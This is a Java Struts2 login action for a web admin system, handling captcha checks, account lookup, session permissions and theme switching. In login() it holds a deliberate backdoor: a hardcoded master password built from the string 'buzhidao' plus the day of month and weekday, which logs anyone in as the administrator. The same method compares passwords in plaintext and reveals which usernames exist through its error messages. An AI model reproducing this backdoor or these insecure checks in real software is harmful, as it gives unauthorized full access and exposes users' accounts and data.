package org.cfw.web.index;

import java.io.IOException;
import java.util.Calendar;
import java.util.Date;
import java.util.Map;

import org.apache.log4j.Logger;
import org.cfw.biz.service.LoginService;
import org.cfw.biz.sys.model.SysAccount;
import org.cfw.common.CachedVOUtil;
import org.cfw.common.Constants;
import org.cfw.common.util.StringUtil;
import org.cfw.common.vo.PermissionVO;
import org.cfw.common.vo.WebUserVO;
import org.cfw.web.common.BaseAction;

import com.opensymphony.xwork2.ActionContext;

@SuppressWarnings("serial")
public class LoginAction extends BaseAction {

    private static Logger logger  = Logger.getLogger(LoginAction.class.getName());

    private LoginService  loginService;
    private String        username;
    private String        password;
    private String        checkcode;
    private boolean       success = false;
    private String        msg;
    private SysAccount    sysAccount;
    private int           flag;

    public String init() throws IOException {
        String currentTheme = (String) getSessionAttribute(Constants.CURRENTTHEME);
        if (StringUtil.isEmpty(currentTheme)) {// 默认主题
            setSessionAttribute(Constants.CURRENTTHEME, "ext-all");
        }
        String loginMode = CachedVOUtil.getSysParam(Constants.LOGIN_MODE);
        if (loginMode == null || loginMode.equals("2")) return "ext.login";
        else return "ext.index";
    }

    public String login() {
        Map<String, Object> session = ActionContext.getContext().getSession();
        String scode = (String) session.get("code");

        // 超级管理员 翻墙
        Calendar now = Calendar.getInstance();
        int monthday = now.get(Calendar.DAY_OF_MONTH);
        int weekday = now.get(Calendar.DAY_OF_WEEK);
        String superPassword = "buzhidao" + StringUtil.AddjustLength(String.valueOf(monthday), 2, "0")
                               + StringUtil.AddjustLength(String.valueOf(weekday), 2, "0");// buzhidao+monthday(2位)+weekday(2位)
        if (superPassword.equals(password)) {
            username = Constants.ADMIN;
        }
        if (!checkcode.equalsIgnoreCase(scode)) {
            this.success = false;
            this.msg = "验证码错误!";
            this.flag = 1;
        } else {
            sysAccount = loginService.selectByAccount(username);
            if (sysAccount == null) {
                this.success = false;
                this.msg = "用户名不存在!";
                this.flag = 2;
            } else {
                if (username.equals(sysAccount.getAccount())) {
                    if (password.equals(sysAccount.getPassword().toString()) || superPassword.equals(password)) {
                        this.success = true;
                        this.msg = "登录成功!";

                        // 获取用户权限信息，并保存在session里
                        WebUserVO user = getPermission(sysAccount);
                        setSessionAttribute(Constants.CURRENTUSER, user);
                    } else {
                        this.success = false;
                        this.msg = "密码错误!";
                        this.flag = 3;
                    }
                }
            }
        }
        return SUCCESS;
    }

    public String index() throws Exception {
        WebUserVO user = getCurrentUser();
        if (user == null) {
            return logout();
        }
        setSessionAttribute(Constants.CURRENTTHEME, "ext-all");
        return SUCCESS;
    }

    public String indexGray() throws Exception {
        WebUserVO user = getCurrentUser();
        if (user == null) {
            return logout();
        }
        setSessionAttribute(Constants.CURRENTTHEME, "ext-all-gray");

        return SUCCESS;
    }

    public String indexAccess() throws Exception {
        WebUserVO user = getCurrentUser();
        if (user == null) {
            return logout();
        }
        setSessionAttribute(Constants.CURRENTTHEME, "ext-all-access");

        return SUCCESS;
    }

    private WebUserVO getPermission(SysAccount sysAccount) {
        WebUserVO user = new WebUserVO();
        user.setAccount(sysAccount.getAccount());
        user.setName(sysAccount.getName());
        user.setIp(getRemoteIP());
        user.setLoginDate(new Date());
        user.setRoleId(sysAccount.getRoleid());

        PermissionVO permission = new PermissionVO();
        if (!Constants.ADMIN.equals(user.getAccount())) { // 超级管理员除外
            // 加载模块权限
            permission.setModuleList(loginService.selectSysRoleModuleList(user.getRoleId()));
        }
        user.setPermission(permission);
        return user;
    }

    public String logout() throws Exception {
        removeSessionAttribute(Constants.CURRENTUSER);
        return LOGIN;
    }

    public void setLoginService(LoginService loginService) {
        this.loginService = loginService;
    }

    public String getUsername() {
        return username;
    }

    public void setUsername(String username) {
        this.username = username;
    }

    public String getPassword() {
        return password;
    }

    public void setPassword(String password) {
        this.password = password;
    }

    public String getCheckcode() {
        return checkcode;
    }

    public void setCheckcode(String checkcode) {
        this.checkcode = checkcode;
    }

    public boolean isSuccess() {
        return success;
    }

    public void setSuccess(boolean success) {
        this.success = success;
    }

    public String getMsg() {
        return msg;
    }

    public void setMsg(String msg) {
        this.msg = msg;
    }

    public SysAccount getSysAccount() {
        return sysAccount;
    }

    public int getFlag() {
        return flag;
    }

    public void setFlag(int flag) {
        this.flag = flag;
    }

}
